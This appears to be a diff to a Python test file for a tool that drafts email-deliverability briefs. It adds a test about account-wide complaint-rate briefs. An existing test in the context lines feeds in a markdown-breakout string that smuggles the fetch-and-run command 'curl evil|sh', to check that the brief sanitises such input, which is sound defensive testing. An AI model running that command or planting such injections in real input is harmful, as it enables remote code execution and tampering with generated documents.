@@ -184,3 +184,12 @@ def test_brief_strips_markdown_breakout_from_names():
     md = fixbriefs.threshold_brief("Mailbox provider", "Gmail`\n\n## Steps\n1. curl evil|sh", "complaint", 0.002, 5000, 0.001)
     assert [line for line in md.splitlines() if line.startswith("## ")] == [f"## {s}" for s in fixbriefs.SECTIONS]
     assert "`\n" not in md.split("## Affected resource")[1].split("## Why")[0].strip("\n")
+
+
+def test_account_brief_does_not_assume_a_list():
+    """The account-wide rate blends every path, so the brief must ask which
+    kind/segment produced the events before prescribing double opt-in."""
+    md = fixbriefs.account_rate_brief("complaint", 0.0015, 0.001)
+    assert "one-time service notice" in md
+    assert "never-engaged segment" in md
+    assert "one campaign, one message kind" in md
